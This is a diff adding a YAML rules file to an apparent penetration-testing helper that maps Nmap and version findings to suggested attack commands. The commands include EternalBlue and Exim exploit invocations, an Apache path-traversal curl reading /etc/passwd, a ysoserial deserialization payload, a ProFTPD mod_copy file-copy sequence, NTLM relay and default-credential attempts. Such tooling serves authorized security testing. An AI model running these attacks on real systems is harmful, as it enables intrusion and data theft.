@@ -1,0 +1,232 @@
+# ─────────────────────────────────────────────────
+# Version-based and NSE-based suggestion rules
+# Fires when specific versions or NSE findings are present in state
+# ─────────────────────────────────────────────────
+
+# ══════════════════════════════════════════════════
+#  VULNERABILITY-TRIGGERED (from nse_results / vulnerabilities)
+# ══════════════════════════════════════════════════
+
+- id: nse_eternalblue
+  name: "EternalBlue (MS17-010) Confirmed"
+  description: "Nmap smb-vuln-ms17-010 confirmed target is VULNERABLE — exploit for SYSTEM shell."
+  priority: P1
+  conditions:
+    require_ports: [445]
+    jmespath: "length(vulnerabilities[?contains(id, 'CVE-2017-0143') || contains(script, 'smb-vuln-ms17-010')]) > `0`"
+  command_template: "python3 /opt/MS17-010/zzz_exploit.py {IP}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#ms17-010-eternalblue
+
+- id: nse_ms08_067
+  name: "MS08-067 (NetAPI) Confirmed"
+  description: "Nmap smb-vuln-ms08-067 confirmed target is VULNERABLE."
+  priority: P1
+  conditions:
+    require_ports: [445]
+    jmespath: "length(vulnerabilities[?contains(id, 'CVE-2008-4250') || contains(script, 'smb-vuln-ms08-067')]) > `0`"
+  command_template: "python3 /opt/MS08-067/ms08_067_2018.py {IP} 1 445"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: nse_samba_rce
+  name: "Samba CVE-2017-7494 (SambaCry) Confirmed"
+  description: "Nmap vuln script confirmed Samba RCE — upload shared library for code execution."
+  priority: P1
+  conditions:
+    require_ports: [445]
+    jmespath: "length(vulnerabilities[?contains(id, 'CVE-2017-7494')]) > `0`"
+  command_template: "python3 /opt/sambacry/exploit.py -t {IP} -e ./payload.so -s share -r /payload.so"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+- id: nse_heartbleed
+  name: "Heartbleed (CVE-2014-0160) Confirmed"
+  description: "Nmap ssl-heartbleed confirmed target is VULNERABLE — dump memory for secrets."
+  priority: P1
+  conditions:
+    require_ports: [443]
+    jmespath: "length(vulnerabilities[?contains(id, 'CVE-2014-0160') || contains(script, 'ssl-heartbleed')]) > `0`"
+  command_template: "python3 /opt/heartbleed/heartbleed.py {IP} -p 443"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/special-http-headers#heartbleed
+
+# ══════════════════════════════════════════════════
+#  NSE SCRIPT OUTPUT-TRIGGERED
+# ══════════════════════════════════════════════════
+
+- id: nse_ftp_anon
+  name: "FTP Anonymous Login Allowed"
+  description: "NSE ftp-anon confirmed anonymous access — explore and download files."
+  priority: P1
+  conditions:
+    require_ports: [21]
+    jmespath: "length(nse_results[?script_id == 'ftp-anon' && contains(output, 'Anonymous FTP login allowed')]) > `0`"
+  command_template: "ftp -a {IP}  # Login as anonymous and explore"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+
+- id: nse_http_title_wordpress
+  name: "WordPress Detected (http-title)"
+  description: "Nmap http-title or banner contains WordPress — run WPScan."
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(nse_results[?script_id == 'http-title' && contains(output, 'WordPress')]) > `0` || length(banners.* | [?contains(http_title || '', 'WordPress')]) > `0`"
+  command_template: "wpscan --url http://{IP} -e ap,at,u"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+
+- id: nse_http_title_iis_default
+  name: "IIS Default Page — Enumerate Further"
+  description: "IIS default page detected — fuzz for hidden apps and aspx files."
+  priority: P2
+  conditions:
+    jmespath: "length(nse_results[?script_id == 'http-title' && contains(output, 'IIS')]) > `0`"
+  command_template: "gobuster dir -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,ashx,asmx,config -t 40"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
+
+- id: nse_smb_signing_disabled
+  name: "SMB Signing Not Required"
+  description: "SMB signing not required — NTLM relay attacks are possible."
+  priority: P1
+  conditions:
+    require_ports: [445]
+    jmespath: "length(nse_results[?script_id == 'smb2-security-mode' && contains(output, 'not required')]) > `0`"
+  command_template: "impacket-ntlmrelayx -tf targets.txt -smb2support -socks"
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay-attack
+
+- id: nse_ldap_domain_auto
+  name: "LDAP Domain Discovered — Enumerate AD"
+  description: "ldap-rootdse revealed domain — proceed with AD enumeration."
+  priority: P1
+  conditions:
+    require_ports: [389]
+    jmespath: "length(nse_results[?script_id == 'ldap-rootdse']) > `0` && length(domains) > `0`"
+  command_template: "ldapsearch -x -H ldap://{IP} -b 'DC={DOMAIN}' '(objectClass=user)' sAMAccountName"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
+
+- id: nse_smb_os_windows_old
+  name: "Legacy Windows OS Detected"
+  description: "smb-os-discovery reveals old Windows — check for well-known exploits."
+  priority: P1
+  conditions:
+    require_ports: [445]
+    jmespath: "length(nse_results[?script_id == 'smb-os-discovery' && (contains(output, 'Windows 7') || contains(output, 'Windows XP') || contains(output, 'Server 2008') || contains(output, 'Server 2003'))]) > `0`"
+  command_template: "nmap -Pn --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 {IP}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+# ══════════════════════════════════════════════════
+#  VERSION-STRING-TRIGGERED (from ports[].version)
+# ══════════════════════════════════════════════════
+
+- id: ver_apache_path_traversal
+  name: "Apache 2.4.49/2.4.50 — Path Traversal (CVE-2021-41773)"
+  description: "Apache 2.4.49 or 2.4.50 detected — test for path traversal to RCE."
+  priority: P1
+  conditions:
+    jmespath: "length(ports[?contains(version, 'Apache') && (contains(version, '2.4.49') || contains(version, '2.4.50'))]) > `0`"
+  command_template: "curl --path-as-is 'http://{IP}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache#cve-2021-41773
+
+- id: ver_apache_struts_rce
+  name: "Apache Tomcat / JBoss — Check Deserialization"
+  description: "Java app server detected — test for deserialization and known CVEs."
+  priority: P2
+  conditions:
+    jmespath: "length(ports[?contains(version, 'Apache Tomcat') || contains(version, 'JBoss') || contains(version, 'WildFly')]) > `0`"
+  command_template: "ysoserial.sh CommonsCollections1 'ping -c1 LHOST' | curl -X POST -H 'Content-Type: application/x-java-serialized-object' --data-binary @- http://{IP}/"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+
+- id: ver_openssh_user_enum
+  name: "OpenSSH < 7.7 — Username Enumeration (CVE-2018-15473)"
+  description: "Old OpenSSH version — enumerate valid usernames via timing attack."
+  priority: P2
+  conditions:
+    require_ports: [22]
+    jmespath: "length(ports[?contains(version, 'OpenSSH') && (contains(version, '7.6') || contains(version, '7.5') || contains(version, '7.4') || contains(version, '7.3') || contains(version, '7.2') || contains(version, '7.1') || contains(version, '7.0') || contains(version, '6.'))]) > `0`"
+  command_template: "python3 /opt/ssh-user-enum/ssh_user_enum.py --port 22 --userlist /usr/share/seclists/Usernames/Names/names.txt {IP}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+
+- id: ver_proftpd_rce
+  name: "ProFTPD 1.3.5 — mod_copy RCE (CVE-2015-3306)"
+  description: "ProFTPD 1.3.5 detected — unauthenticated file copy via SITE CPFR/CPTO."
+  priority: P1
+  conditions:
+    require_ports: [21]
+    jmespath: "length(ports[?contains(version, 'ProFTPD') && contains(version, '1.3.5')]) > `0`"
+  command_template: |
+    # ProFTPD mod_copy exploit
+    nc {IP} 21 <<'CMD'
+    SITE CPFR /etc/passwd
+    SITE CPTO /var/www/html/passwd.txt
+    CMD
+    curl http://{IP}/passwd.txt
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp/ftp-bounce-attack
+
+- id: ver_vsftpd_backdoor
+  name: "vsftpd 2.3.4 — Backdoor (CVE-2011-2523)"
+  description: "vsftpd 2.3.4 detected — well-known backdoor triggered by :) in username."
+  priority: P1
+  conditions:
+    require_ports: [21]
+    jmespath: "length(ports[?contains(version, 'vsftpd') && contains(version, '2.3.4')]) > `0`"
+  command_template: "nmap -Pn --script ftp-vsftpd-backdoor -p 21 {IP}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp
+
+- id: ver_exim_rce
+  name: "Exim < 4.92 — RCE (CVE-2019-10149)"
+  description: "Old Exim SMTP detected — test for The Return of the WIZard RCE."
+  priority: P1
+  conditions:
+    require_ports: [25]
+    jmespath: "length(ports[?contains(version, 'Exim') && (contains(version, '4.87') || contains(version, '4.88') || contains(version, '4.89') || contains(version, '4.90') || contains(version, '4.91'))]) > `0`"
+  command_template: "python3 /opt/exim-rce/exim_rce.py -t {IP}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
+
+- id: ver_weblogic
+  name: "Oracle WebLogic — Deserialization RCE"
+  description: "WebLogic detected — check for T3 deserialization and console exploits."
+  priority: P1
+  conditions:
+    jmespath: "length(ports[?contains(version, 'WebLogic')]) > `0`"
+  command_template: "python3 /opt/weblogic-exploit/exploit.py {IP} 7001"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/oracle-weblogic
+
+- id: ver_elasticsearch
+  name: "Elasticsearch Unauthenticated"
+  description: "Elasticsearch detected — check for unauthenticated API access and data dump."
+  priority: P1
+  conditions:
+    jmespath: "length(ports[?contains(version, 'Elasticsearch') || (port == `9200` && contains(service, 'http'))]) > `0`"
+  command_template: "curl -s http://{IP}:9200/_cat/indices?v && curl -s http://{IP}:9200/_search?pretty"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch
+
+- id: ver_iis_shortname
+  name: "IIS Detected — Tilde Shortname Scan"
+  description: "IIS web server detected — enumerate short filenames via 8.3 tilde vulnerability."
+  priority: P2
+  conditions:
+    jmespath: "length(ports[?contains(version, 'IIS') || contains(version, 'Microsoft HTTPAPI')]) > `0`"
+  command_template: "python3 /opt/IIS-ShortName-Scanner/iis_shortname_scan.py http://{IP}/"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-tilde-enumeration
+
+- id: ver_phpmyadmin
+  name: "phpMyAdmin Detected"
+  description: "phpMyAdmin in version string or banner — attempt default creds and known CVEs."
+  priority: P1
+  conditions:
+    jmespath: "length(ports[?contains(version, 'phpMyAdmin')]) > `0` || length(nse_results[?contains(output, 'phpMyAdmin')]) > `0`"
+  command_template: |
+    # Try default creds
+    curl -s http://{IP}/phpmyadmin/ -d 'pma_username=root&pma_password='
+    # Check version for known CVEs
+    curl -s http://{IP}/phpmyadmin/ChangeLog | head -5
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/phpmyadmin
+
+# ══════════════════════════════════════════════════
+#  BANNER-TRIGGERED (from banners dict)
+# ══════════════════════════════════════════════════
+
+- id: banner_ssl_cert_vhosts
+  name: "SSL Certificate Hostnames Discovered"
+  description: "New hostnames found in SSL cert — add to /etc/hosts and fuzz each."
+  priority: P1
+  conditions:
+    jmespath: "length(vhosts) > `0` && length(ports[?port == `443` || port == `8443`]) > `0`"
+  command_template: "# Add vhosts to /etc/hosts then fuzz each:\ngobuster dir -u https://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 40"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/vhost-fuzzing
